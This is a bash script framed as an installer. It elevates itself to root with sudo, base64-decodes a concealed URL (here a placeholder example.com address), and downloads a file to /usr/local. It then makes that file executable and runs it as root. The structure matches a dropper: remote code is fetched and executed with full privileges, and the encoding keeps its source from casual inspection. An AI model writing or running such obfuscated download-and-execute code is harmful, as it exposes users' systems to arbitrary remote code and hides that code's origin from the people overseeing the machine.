#!/bin/bash
# Ensure script is run as bash
if [ -z "$BASH" ]; then
    bash "$0" "$@"
    exit 0
fi

# Check for root
if [ "$(id -u)" != "0" ]; then
    sudo bash "$0" "$@"
    exit $?
fi

# Function to fetch and execute installer
download_and_run_installer() {
    local encoded_url=$1
    local url=$(echo $encoded_url | base64 --decode)
    echo "Attempting to download installer..."
    wget -O /usr/local/myinstaller "$url" || curl -o /usr/local/myinstaller "$url"
    chmod +x /usr/local/myinstaller
    /usr/local/myinstaller "$@"
}

# Example encoded URLs
urls=("aHR0cHM6Ly9leGFtcGxlLmNvbS9teWluc3RhbGxlci5zaA==")

# Iterate over encoded URLs
for encoded_url in "${urls[@]}"; do
    download_and_run_installer "$encoded_url" && break
done

if [ ! -s /usr/local/myinstaller ]; then
    echo "Failed to download or install."
    exit 1
fi

echo "Installation complete."
